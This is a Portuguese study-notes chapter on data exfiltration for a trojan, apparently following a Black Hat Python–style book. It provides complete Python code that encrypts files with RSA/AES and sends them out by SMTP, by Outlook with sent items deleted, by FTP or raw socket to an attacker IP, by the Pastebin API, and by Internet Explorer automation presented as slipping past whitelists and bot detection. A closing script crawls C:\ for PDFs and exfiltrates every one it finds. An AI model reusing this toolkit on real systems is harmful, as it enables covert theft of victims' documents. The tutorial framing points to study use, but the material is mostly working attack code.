# Capitulo 9 

Nesse capítulo serão exploradas técnicas de exfiltração que podem ser úteis para o nosso estudo

## Explorando a técnica de exfiltração

[Exfiltração ou sequestro de dados](https://en.wikipedia.org/wiki/Data_theft) é um termo para indicar o roubo de arquivos de dados criptografados de um sistema invadido. Usaremos para a exfiltração 3 métodos principais: por email, por transferência de arquivos e por postagens web. 

Vale ressaltar que, para máquinas Windows, usaremos o PyWin32, uma série de libs próprias para manipulação de dados no Windows que usamos no capítulo 8. Usaremos automação do COM (Component Object Model), que oferece serviços de integração legais para o nosso uso.

Nesse capítulo não vou focar muito em testar todos os códigos pois não é do meu interesse no momento fazer esse tipo de exfiltração. Pode-se alterar os arquivos do Git para fazer isso por exemplo (capítulo 7).

### Criptografando e descriptografando arquivos

Utilizaremos a lib `pycryptodomex` para realizar as tarefas de criptografia:

```bash
pip install pycryptodomex
```

Em `cryptor.py`:

```py
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from io import BytesIO

import base64
import zlib
```

Inicialmente, a nossa ideia é fazer uma criptografia híbrida, combinando partes de *criptografia simétrica* (que usa uma mesma chave tanto para encriptar quando para decriptar) e partes de *criptografia assimétrica* (que usa o esquema de chave pública e privada). O AES é um exemplo do primeiro caso, ele lida com grandes quantidades de texto. Utilizaremos ele para cifrar informações que queremos exfiltrar.

Para a criptografia assimétrica usaremos o RSA, usando um par de chaves. Utilizaremos ele para encriptar/decriptar a **chave** do AES, pois ele é mais eficiente em textos pequenos.

Essa abordagem híbrida é muito comum no TLS (Transport Layer Security, já visto em capítulos anteriores). Começaremos o código com uma função para criar o par de chaves do RSA:

```py
def generate(): # Função para gerar o par de chaves
    new_key = RSA.generate(2048)    # Usa a lib do RSA para gerar uma chave de 2048 bits
    private_key = new_key.export_key()  # pega a chave privada
    public_key = new_key.publickey().export_key()   # pega a chave pública
    
    with open('key.pri', 'wb') as f:
        f.write(private_key)    # salva em arquivos
        
    with open('key.pub', 'wb') as f:
        f.write(public_key)     
```

Agora, com as chaves em mãos, criaremos uma função para auxiliar a leitura das chaves:

```py
def get_rsa_cipher(keytype):   # passamos o tipo de chave
    with open(f'key.{keytype}') as f:
        key = f.read()      # lemos a chave
    rsa_key = RSA.import_key(key)   # importamos como chave RSA 
    return (PKCS1_OAEP.new(rsa_key), rsa_key.size_in_bytes())   # retornamos o objeto Cipher da chave (PKCS) e o seu tamanho em bytes
```

Com as chaves geradas e com os objetos de chave capturados, vamos criar uma função de encriptar os dados:

```py
def encrypt(plaintext):
    # Comprime o texto simples usando o algoritmo de compressão zlib.
    # Isso reduz o tamanho dos dados antes da criptografia, o que pode
    # melhorar a eficiência do armazenamento ou transmissão.
    compressed_text = zlib.compress(plaintext)
    
    # Gera uma chave de sessão aleatória de 16 bytes.
    # Essa chave será usada para criptografia simétrica (AES).
    session_key = get_random_bytes(16)
    
    # Cria uma instância do cifrador AES no modo EAX, que é um modo seguro
    # e inclui autenticação para garantir a integridade dos dados.
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    
    # Encripta o texto comprimido usando a chave de sessão e calcula
    # um "tag" de autenticação que será usado para verificar a integridade
    # e autenticidade do texto cifrado.
    cipher_text, tag = cipher_aes.encrypt_and_digest(compressed_text)
    
    # Obtém uma instância de um cifrador RSA usando uma chave pública
    cipher_rsa, _ = get_rsa_cipher('pub')
    
    # Encripta a chave de sessão AES com o RSA. Isso permite que a chave de sessão
    # seja compartilhada com segurança, já que apenas o destinatário com a chave
    # privada correspondente poderá decifrá-la.
    encrypted_session_key = cipher_rsa.encrypt(session_key)
    
    # Concatena a chave de sessão cifrada (RSA), o "nonce" gerado pelo AES,
    # o "tag" de autenticação e o texto cifrado. Esse é o payload completo
    # que será necessário para decifrar a mensagem.
    # nonce = number used once, é uma forma de verificar que o algoritmo está funcionando
    # pois verifica se o mesmo texto cifrado, com a mesma chave, não produzam a mesma mensagem
    # se parece com um salt
    msg_payload = encrypted_session_key + cipher_aes.nonce + tag + cipher_text
    
    # Codifica o payload final em base64 para garantir que ele possa ser
    # armazenado ou transmitido de forma segura, sem problemas de codificação.
    encrypted = base64.encodebytes(msg_payload)
    
    # Retorna o payload criptografado codificado em base64.
    return encrypted
```

Finalmente, faremos então a função para decriptar o texto:

```py
def decrypt(encrypted):
    # Cria um buffer de memória para a mensagem encriptada, facilita a leitura (usada no .read() em sequencia)
    encrypted_bytes = BytesIO(base64.decodebytes(encrypted))
    cipher_rsa, keysize_in_bytes = get_rsa_cipher('pri')    # pega a chave privada e o tamanho dela em bytes (será usado para 
                                                            # capturar os bytes da chave AES)
    
    # Sabemos que no encrypt() a sequencia era : chave + nonce + tag + texto. Sabemos também que o nonce e a tag ambos tem 16 bytes
    # Como estamos com um buffer do BytesIO, a cada leitura "sobra" o resto da mensagem, possibilitando esse sequenciamento de leitura
    encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)  # pega os N bytes da chave encriptada
    nonce = encrypted_bytes.read(16)    # sabemos que ambos são de 16 bytes pois é o tamanho padrão para o modo EAX
    tag = encrypted_bytes.read(16)
    ciphertext = encrypted_bytes.read() # finalmente, lemos a mensagem
    
    session_key = cipher_rsa.decrypt(encrypted_session_key) # decriptamos a chave
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)  # Criamos um objeto AES com o texto usando o nonce e a chave
    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)  # verificamos e decriptamos, resultando no arquivo original comprimido
    
    plaintext = zlib.decompress(decrypted)
    return plaintext    # descomprimimos e retornamos


if __name__ == '__main__':
    # Usamos primeiro o generate para pegar as chaves. No caso real pode ser que se queira deixá-las em lugares separados

    # generate()
    
    plaintext = b'TESTE '
    print(decrypt(encrypt(plaintext)))  # testamos a função com um texto binário
```

Pronto! Agora você tem seu próprio método de encriptar e decriptar mensagens de forma segura.

### Exfiltração por email

Agora que temos o nosso próprio modo de encriptar e decriptar, começaremos a estudar o meio de realizar a exfiltração de fato. Começaremos por email.

Em `email_exfil.py`:

```py
import smtplib  # Importa a biblioteca para envio de e-mails via SMTP.
import time  # Importa para permitir pausas na execução.
import win32com.client  # Importa para interagir com aplicativos Windows, como o Outlook.

# Configurações para o servidor SMTP (e-mail de envio).
smtp_server = 'smtp.mail.com'  # Endereço do servidor SMTP.
smtp_port = 587  # Porta usada para conexão segura (TLS).
smtp_acc = 'asdas@mail.com'  # E-mail do remetente.
smtp_pass = 'senha'  # Senha do e-mail do remetente.
tgt_accs = ['asdas@mail.com']  # Lista de destinatários.

# Função para enviar e-mails simples via SMTP.
def plain_email(subject, contents):
    """
    Envia um e-mail simples usando SMTP.
    :param subject: Assunto do e-mail (string).
    :param contents: Conteúdo do e-mail (em bytes).
    """
    # Criação da mensagem no formato esperado pelo SMTP.
    message = f'Assunto: {subject}\nDe: {smtp_acc}'
    message += f'\nPara: {", ".join(tgt_accs)}\n\n{contents.decode()}'
    
    # Conexão com o servidor SMTP.
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  # Inicia a conexão segura (TLS).
    server.login(smtp_acc, smtp_pass)  # Faz login com as credenciais fornecidas.
    
    server.set_debuglevel(1)  # Define o nível de debug (imprime logs do SMTP).
    server.sendmail(smtp_acc, tgt_accs, message)  # Envia o e-mail.
    time.sleep(1)  # Pausa de 1 segundo (possivelmente para evitar problemas com servidores).
    server.quit()  # Fecha a conexão com o servidor SMTP.

# Função para enviar e-mails utilizando o Microsoft Outlook.
def outlook(subject, contents):
    """
    Envia um e-mail usando o cliente Outlook do Windows.
    :param subject: Assunto do e-mail (string).
    :param contents: Conteúdo do e-mail (em bytes).
    """
    outlook = win32com.client.Dispatch('Outlook.Application')  # Inicializa o Outlook via COM.
    message = outlook.CreateItem(0)  # Cria um novo item de e-mail.
    message.DeleteAfterSubmit = True  # Remove o e-mail da pasta de enviados após envio.
    message.Subject = subject  # Define o assunto do e-mail.
    message.Body = contents.decode()  # Define o corpo do e-mail (convertendo de bytes para string).
    message.To = tgt_accs[0]  # Define o destinatário (apenas o primeiro da lista).
    message.Send()  # Envia o e-mail.

# Bloco principal do script.
if __name__ == '__main__':
    # Envia um e-mail de teste usando a função `plain_email`.
    plain_email('test_message a', b'asdsadasd')  # Chama a função com assunto e corpo em bytes.
```

Não consegui testar direio o código pois os meus emails todos precisavam de autenticação de 2 etapas.

### Exfiltração por tranferência de arquivos

Em `transmit_exfil.py`:

```py
import ftplib  # Biblioteca para manipular conexões FTP.
import os      # Biblioteca para interagir com o sistema operacional.
import socket  # Biblioteca para trabalhar com sockets de rede.
import win32file  # Biblioteca para funções de arquivos específicas do Windows.

# Função que realiza a transferência de um arquivo via FTP.
def plain_ftp(docpath, server='192.168.100.98'):
    # Cria uma conexão FTP com o servidor especificado.
    ftp = ftplib.FTP(server)
    # Faz login como usuário anônimo.
    ftp.login("anonymous", "anon@example.com")
    # Altera o diretório atual no servidor FTP para "/pub/".
    ftp.cwd('/pub/')
    # Envia o arquivo especificado pelo caminho 'docpath' para o servidor FTP.
    # Usa o nome base do arquivo (os.path.basename(docpath)) como nome no servidor.
    ftp.storbinary("STOR " + os.path.basename(docpath), 
                   open(docpath, "rb"), 1024)
    # Encerra a conexão com o servidor FTP.
    ftp.quit()

# Função que realiza a transferência de um arquivo usando sockets e a função TransmitFile.
def transmit(document_path):
    # Cria um socket do cliente para comunicação.
    client = socket.socket()
    # Conecta ao servidor na porta 10000.
    client.connect(('192.168.100.98', 10000))
    # Abre o arquivo especificado em modo de leitura binária.
    with open(document_path, 'rb') as f:
        # Usa a função win32file.TransmitFile para enviar o arquivo através do socket.
        # A função recebe o socket do cliente, um handle do arquivo, e outros parâmetros
        # necessários para realizar a transferência com eficiência.
        win32file.TransmitFile(client,
                               win32file._get_osfhandle(f.fileno()),  # Handle do arquivo.
                               0, 0, None, 0, b'', b'')  # Parâmetros adicionais.

# Bloco principal do programa.
if __name__ == '__main__':
    # Chama a função transmit() para enviar o arquivo "arquivo.txt".
    transmit('./arquivo.txt')
```

O código acima foi testado com o `tcp_server.py` do capítulo 2. A parte de FTP não foi testada.

### Exfiltração por meio de um servidor web

Assim como alguns casos anteriores, os autores propuseram para testar o envio de arquivos em um site chamado [Pastebin](https://pastebin.com/), o qual eu não consegui acessar. Mas, como falado anteriormente, não é meu interesse atual adentrar nesse contexto de tranferência de arquivos. Colocarei o código em `paste_exfil.py`:

```py
from win32com import client  # Importa o módulo 'client' do pacote 'win32com' (não é usado no código atual).

import os                   # Importa o módulo 'os', que fornece funções para interagir com o sistema operacional (não usado no código atual).
import random               # Importa o módulo 'random', usado para gerar números aleatórios (não usado no código atual).
import requests             # Importa o módulo 'requests', usado para realizar chamadas HTTP.
import time                 # Importa o módulo 'time', usado para operações relacionadas ao tempo (não usado no código atual).

# Credenciais e chave de desenvolvedor da API para autenticação.
username = 'caio'           # Nome de usuário para a API do Pastebin.
password = 'senha'          # Senha do usuário para a API do Pastebin.
api_dev_key = 'xxxxxxxxxxxxxxxxxxx'  # Chave de desenvolvedor da API do Pastebin.

def plain_paste(title, contents):
    """
    Cria e envia um paste para o Pastebin, autenticando o usuário antes.
    
    Parâmetros:
    - title: Título do paste (string).
    - contents: Conteúdo do paste (deve ser em bytes, mas o código espera uma string e tenta decodificar).

    Lógica:
    1. Realiza login na API do Pastebin para obter uma chave de usuário (api_user_key).
    2. Usa a chave de usuário para enviar o paste para a API do Pastebin.
    """
    # URL de login para a API do Pastebin.
    login_url = 'https://pastebin.com/api/api_login.php'
    
    # Dados para realizar login na API.
    login_data = {
        'api_dev_key': api_dev_key,  # Chave de desenvolvedor.
        'api_user_name': username,  # Nome de usuário.
        'api_user_password': password  # Senha do usuário.
    }
    
    # Realiza uma requisição POST para autenticação.
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text  # Resposta contém a chave do usuário (api_user_key).
    
    # URL para enviar o paste.
    paste_url = 'https://pastebin.com/api/api_post.php'
    
    # Dados para o envio do paste.
    paste_data = {
        'api_paste_name': title,  # Título do paste.
        'api_paste_code': contents.decode(),  # Conteúdo do paste (tentativa de decodificar; pode causar erro se não for bytes).
        'api_dev_key': api_dev_key,  # Chave de desenvolvedor.
        'api_user_key': api_user_key,  # Chave do usuário obtida no login.
        'api_option': 'paste',  # Indica que a ação é criar um paste.
        'api_paste_private': 0,  # Define a visibilidade do paste (0 = público).
    }
    
    # Realiza uma requisição POST para criar o paste.
    r = requests.post(paste_url, data=paste_data)
    
    # Exibe o código de status da resposta (indicando sucesso ou falha) e o corpo da resposta.
    print(r.status_code)
    print(r.text)
```

Em seguida, escreveremos uma técnica de postagem através do Internet Explorer. Os autores explicam que isso será feito pois muitos ambiente corporativos o utilizam como navegador-padrão e é quase impossível removê-lo dos aplicativos Windows. Logo é importante que o seu trojan possa ter técnicas de utilizá-lo:

```
Vamos ver como podemos explorar o Internet Explorer para ajudar a exfiltrar informações de uma rede alvo. Um companheiro de segurança canadense pesquisador, Karim Nathoo, apontou que o Internet Explorer COM a automação tem o maravilhoso benefício de usar o Iexplore.exe processo, que normalmente é confiável e está na lista de permissões, para exfiltrar informações de uma rede. 
```

Criaremos duas funções auxiliares:

```py
def wait_for_browser(browser):
    # Essa função é utilizada para aguardar que o estado do navegador seja "pronto".
    # O navegador é representado pelo objeto `browser`, que deve ter o atributo `ReadyState`.
    # A função entra em um loop que verifica se o estado (`ReadyState`) do navegador não é 4 (geralmente indicando "pronto")
    # e também não é "complete". Enquanto isso, ela faz uma pausa de 0.1 segundos em cada iteração do loop.
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)  # Faz uma pausa de 0.1 segundo para evitar um loop constante.

def random_sleep():
    # Essa função faz o programa "dormir" por um período de tempo aleatório entre 5 e 10 segundos.
    # É usada a função `randint` do módulo `random` para gerar um número inteiro aleatório nesse intervalo.
    time.sleep(random.randint(5,10))  # Pausa a execução por um tempo aleatório gerado.
```

De acordo com os autores, essas funções foram projetadas para que o navegador execute tarefas que talvez não registrem eventos no DOM (Document Object Model) para sinalizar que foram concluídas. Isso fará com que o navegador pareça um pouco mais humano.

Continuando...:

```py
def login(ie):
    full_doc = ie.Document.all  # Obtém todos os elementos do DOM do navegador.
    for elem in full_doc:
        if elem.id == 'loginform-username':  # Localiza o campo de entrada do nome de usuário.
            elem.setAttribute('value', username)  # Insere o valor do nome de usuário.
        elif elem.id == 'loginform-password':  # Localiza o campo de entrada da senha.
            elem.setAttribute('value', password)  # Insere o valor da senha.
            
    random_sleep()  # Insere uma pausa aleatória antes de continuar.

    # Verifica se o formulário tem o ID esperado ('w0') e o submete.
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    wait_for_browser(ie)  # Aguarda o carregamento completo após o envio.

def submit(ie, title, contents):
    full_doc = ie.Document.all  # Obtém todos os elementos do DOM do navegador.
    for elem in full_doc:
        if elem.id == 'postform-name':  # Localiza o campo do título da postagem.
            elem.setAttribute('value', title)  # Insere o título fornecido.
        elif elem.id == 'postform-text':  # Localiza o campo de conteúdo da postagem.
            elem.setAttribute('value', contents)  # Insere o conteúdo fornecido.

    # Verifica se o formulário tem o ID esperado ('w0') e o submete.
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    random_sleep()  # Insere uma pausa aleatória antes de continuar.
    wait_for_browser(ie)  # Aguarda o carregamento completo após o envio.


def ie_paste(title, contents):
    ie = client.Dispatch('InternetExplorer.Application')  # Cria uma instância do Internet Explorer.
    ie.Visible = 1  # Torna o navegador visível.

    ie.Navigate('https://pastebin.com/login')  # Navega até a página de login.
    wait_for_browser(ie)  # Aguarda o carregamento completo.
    login(ie)  # Executa a função de login.

    ie.Navigate('https://pastebin.com/')  # Navega até a página principal do site.
    wait_for_browser(ie)  # Aguarda o carregamento completo.
    submit(ie, title, contents.decode())  # Executa a função para enviar os dados (título e conteúdo).

    ie.Quit()  # Fecha o navegador.

if __name__ == '__main__':
    ie_paste('title', 'contents')
```

De acordo com a explicação do ChatGPT:

```
O código fornecido possui duas abordagens principais para interagir com o site Pastebin: uma usando a API do Pastebin e outra através da automação do navegador Internet Explorer. A função `plain_paste` realiza o login na API do Pastebin utilizando credenciais fornecidas, recuperando uma chave de usuário necessária para a autenticação. Após a autenticação, a função envia o título e o conteúdo para o site através de uma solicitação HTTP POST, usando a chave de desenvolvedor e a chave de usuário. O código imprime o status e a resposta da solicitação HTTP, fornecendo feedback sobre o sucesso ou falha da operação.

Por outro lado, a função `ie_paste` utiliza o módulo `win32com.client` para automatizar o Internet Explorer, simulando a navegação no site do Pastebin. Ela realiza o login, navega até a página principal do site e preenche um formulário de postagem com o título e o conteúdo fornecidos, antes de submeter o formulário. O uso das funções `wait_for_browser` e `random_sleep` garante que o script espere que o navegador carregue completamente entre as ações e insira intervalos aleatórios, possivelmente para evitar ser detectado como um bot. Ambas as abordagens têm o objetivo de enviar dados ao Pastebin, uma usando a API e a outra utilizando automação do navegador.
```

### Juntando todas as peças

Faremos agora um agregado do que fizemos de exfiltração:

```py
from cryptor import encrypt, decrypt  # Importa funções de criptografia para proteger os dados.
from email_exfil import outlook, plain_email  # Importa métodos de exfiltração de dados por e-mail.
from transmit_exfil import plain_ftp, transmit  # Importa métodos de exfiltração de dados via FTP ou outros protocolos de transmissão.
from paste_exfil import ie_paste, plain_paste  # Importa métodos para exfiltrar dados via pastebin ou outros serviços de colagem.
import os  # Importa o módulo os para interagir com o sistema de arquivos.

# Um dicionário que mapeia os métodos de exfiltração para suas respectivas funções.
EXFIL = {
    'outlook': outlook,  # Exfiltração via Outlook.
    'plain_email': plain_email,  # Exfiltração via e-mail simples.
    'plain_ftp': plain_ftp,  # Exfiltração via FTP simples.
    'transmit': transmit,  # Exfiltração via algum método de transmissão.
    'ie_paste': ie_paste,  # Exfiltração via Pastebin usando Internet Explorer.
    'plain_paste': plain_paste,  # Exfiltração via Pastebin usando método simples.
}

# Função para localizar documentos de um tipo específico (por padrão, arquivos PDF) no sistema.
def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('c:\\'):  # Caminha por todos os diretórios e subdiretórios de 'c:\'.
        for filename in filenames:
            if filename.endswith(doc_type):  # Verifica se o arquivo tem a extensão desejada.
                document_path = os.path.join(parent, filename)  # Cria o caminho completo do documento.
                yield document_path  # Retorna o caminho do documento encontrado.

# Função que realiza a exfiltração de dados do documento.
def exfiltrate(document_path, method):
    if method in ['transmit', 'plain_ftp']:  # Se o método de exfiltração for 'transmit' ou 'plain_ftp'.
        
        # Cria um novo caminho para o arquivo temporário na pasta 'c:\\windows\\temp'.
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        
        # Abre o arquivo original e lê seu conteúdo.
        with open(document_path, 'rb') as f0:
            contents = f0.read()  # Lê o conteúdo do arquivo.
        
        # Cria um arquivo temporário e grava os dados criptografados nele.
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))  # Criptografa e escreve o conteúdo no arquivo temporário.
        
        # Chama a função de exfiltração do método especificado, passando o arquivo temporário.
        EXFIL[method](filename)
        
        # Exclui o arquivo temporário após o envio.
        os.unlink(filename)
    else:  # Para os outros métodos de exfiltração (como pastebin e e-mail).
        # Abre o documento e lê seu conteúdo.
        with open(document_path, 'rb') as f:
            contents = f.read()
            title = os.path.basename(document_path)  # O título do documento será o nome do arquivo.
            contents = encrypt(contents)  # Criptografa o conteúdo do documento.
        
        # Chama a função de exfiltração correspondente, passando o título e o conteúdo criptografado.
        EXFIL[method](title, contents)
        
# Bloco principal que inicia o processo de exfiltração.
if __name__ == '__main__':
    for fpath in find_docs():  # Para cada caminho de arquivo encontrado pela função find_docs().
        exfiltrate(fpath, 'plain_paste')  # Chama a função de exfiltração, usando o método 'plain_paste'.
```

Basicamente um seletor de métodos com todos os métodos que criamos.

### Explorando o código

Como falei, não me importei em testar a exfiltração por email nem por FTP, quiça por Pastebin. Fica ao interesse de quem estiver estudando este documento testar. Qualquer coisa sempre tem o GPT para ajudar.
